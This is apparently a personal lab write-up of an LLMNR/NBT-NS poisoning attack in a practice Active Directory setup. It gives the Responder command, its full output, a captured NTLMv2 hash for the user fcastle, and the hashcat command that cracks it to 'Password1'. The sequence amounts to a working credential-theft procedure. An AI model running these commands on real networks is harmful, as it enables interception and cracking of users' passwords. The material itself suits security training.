# LLMR posisoning
## Setup Responder to intercept victim machine hash

`responder -I wlp1s0 -dwPv`

Then I will get this result
```
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlp1s0]
    Responder IP               [192.168.1.103]
    Responder IPv6             [2405:9800:b660:e549:8cfb:fdfb:cef7:c6ac]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-E930F3QTUZT]
    Responder Domain Name      [7L66.LOCAL]
    Responder DCE-RPC Port     [46460]

[+] Listening for events...

[*] [DHCP] Found DHCP server IP: 192.168.1.1, now waiting for incoming requests...
```

Next step waiting to victim machine connect to my parrot OS running with `Responder tool` by open victim VM and access to `\\192.168.1.103` which is my Parrot OS ip then I go back to my responder terminal. I get this result which contain domain/username and hashed password

```
[*] [NBT-NS] Poisoned answer sent to 192.168.1.102 for name MARVEL (service: Browser Election)
[SMB] NTLMv2-SSP Client   : 192.168.1.102
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:b24fa80fc572b823:865B3CF45D99742E5A92ED01DDB5935A:0101000000000000003832BBE9B9DA01F84AFF5C2A35AB97000000000200080037004C003600360001001E00570049004E002D004500390033003000460033005100540055005A00540004003400570049004E002D004500390033003000460033005100540055005A0054002E0037004C00360036002E004C004F00430041004C000300140037004C00360036002E004C004F00430041004C000500140037004C00360036002E004C004F00430041004C0007000800003832BBE9B9DA0106000400020000000800300030000000000000000000000000300000DA23453DD10096EE415A818D15829B4CCB723E93BDB56C2572F7E724C442FC3D0A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E0031002E003100300033000000000000000000
```

## Crack hashed password

First step I want to know what hashcat mode I have to use to crack NTLM hash

```
hashcat --help | grep NTLM
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM                                                       | Operating System
```
As I know is the hashed password is NTMLv2 so I decided to use `5600` mode

`hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt`

this is the result

```
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

FCASTLE::MARVEL:b24fa80fc572b823:865b3cf45d99742e5a92ed01ddb5935a:0101000000000000003832bbe9b9da01f84aff5c2a35ab97000000000200080037004c003600360001001e00570049004e002d004500390033003000460033005100540055005a00540004003400570049004e002d004500390033003000460033005100540055005a0054002e0037004c00360036002e004c004f00430041004c000300140037004c00360036002e004c004f00430041004c000500140037004c00360036002e004c004f00430041004c0007000800003832bbe9b9da0106000400020000000800300030000000000000000000000000300000da23453dd10096ee415a818d15829b4ccb723e93bdb56c2572f7e724c442fc3d0a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e003100300033000000000000000000:Password1
```

Now I know that the plaintext password is `Password1`

## Summary

username = fcastle
domain = MARVEL
password = Password1